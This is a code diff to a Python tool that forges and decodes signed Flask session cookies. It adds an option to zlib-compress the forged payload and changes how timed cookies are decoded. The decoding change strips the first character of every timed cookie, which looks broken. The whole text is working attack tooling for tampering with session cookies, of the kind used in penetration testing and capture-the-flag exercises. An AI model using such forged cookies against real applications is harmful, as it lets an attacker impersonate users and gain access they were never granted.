@@ -7,10 +7,11 @@ import zlib
 
 class FlaskCookieForger:
     def __init__(self, mode: int, payload: str or None, signer_type: str, secret_key: str, salt: str,
-                 serializer_type: str, key_derivation: str, digest_method: str):
+                 serializer_type: str, key_derivation: str, digest_method: str, do_compress: bool):
         self.__payload = payload
         self.__signer  = None
         self.__signer_type = signer_type
+        self.__do_compress = do_compress
         if signer_type == "URLSafeTimedSerializer":
             serializer = None
             if serializer_type == "session_json_serializer":
@@ -37,7 +38,11 @@ class FlaskCookieForger:
         if self.__payload is None:
             print(colored('[-]', 'red') + ' For forge cookie you must specify payload')
             exit(-1)
-        forged_session = self.__signer.dumps(self.__payload)
+        if self.__do_compress:
+            forged_session = self.__signer.dumps(zlib.compress(self.__payload.encode('utf-8')))
+            forged_session = '.' + forged_session
+        else:
+            forged_session = self.__signer.dumps(self.__payload)
         print(colored('[+]', 'green') + ' session successful forged')
         print('You cookie = ' + colored(forged_session, 'yellow'))
         return forged_session
@@ -65,7 +70,7 @@ class FlaskCookieForger:
             if self.__signer_type == "URLSafeSerializer":
                 session_data= self.__signer.loads(self.__payload)
             else:
-                session_data, timestamp = self.__signer.loads(self.__payload, return_timestamp=True)
+                session_data, timestamp = self.__signer.loads(self.__payload[1:], return_timestamp=True)
             if is_compressed:
                 session_data = zlib.decompress(session_data)
             print('Cookie = ' + colored(session_data, 'yellow') + '\tTimestamp = ' + colored(timestamp, 'yellow'))
@@ -129,6 +134,9 @@ if __name__ == "__main__":
                         help='Type of serializer you want to use. Default value is session_json_serializer.')
     parser.add_argument('--key_derivation', default='hmac', help='Key Derivation method. Default value is hmac.')
     parser.add_argument('--digest_method', default='sha1', help='Digest Method. Default value is sha1.')
+    parser.add_argument('--do_compress', help='The parameter is responsible for whether or not to use compression when'
+                                              ' forge cookies in forger mode. By default set to False',
+                        action="store_true")
     args = parser.parse_args()
     mode = None
     payload = None
@@ -147,5 +155,7 @@ if __name__ == "__main__":
     serializer_type = args.serializer_type
     key_derivation = args.key_derivation
     digest_method = args.digest_method
+    do_compress = args.do_compress
     FlaskCookieForger(mode=mode, payload=payload, signer_type=signer_type, secret_key=secret_key, salt=salt,
-                      serializer_type=serializer_type, key_derivation=key_derivation, digest_method=digest_method)
+                      serializer_type=serializer_type, key_derivation=key_derivation, digest_method=digest_method,
+                      do_compress=do_compress)
